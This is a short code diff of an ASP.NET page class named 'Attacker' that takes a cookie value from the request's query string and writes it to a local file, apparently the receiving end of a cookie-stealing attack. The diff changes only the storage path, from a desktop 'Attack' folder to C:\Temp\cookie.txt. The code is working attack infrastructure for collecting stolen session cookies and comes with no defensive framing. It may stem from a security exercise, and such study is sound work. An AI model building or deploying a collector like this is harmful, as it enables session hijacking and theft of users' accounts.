@@ -12,7 +12,7 @@ public partial class Attacker : System.Web.UI.Page
     {
 
         String cookie = Request.QueryString.Get("Cookie");
-        String filename = "C:\\Users\\haozhenxiao\\Desktop\\Attack\\cookie.txt";
+        String filename = "C:\\Temp\\cookie.txt";
         System.IO.StreamWriter file = new System.IO.StreamWriter(filename);
         file.WriteLine(cookie);
         file.Close();
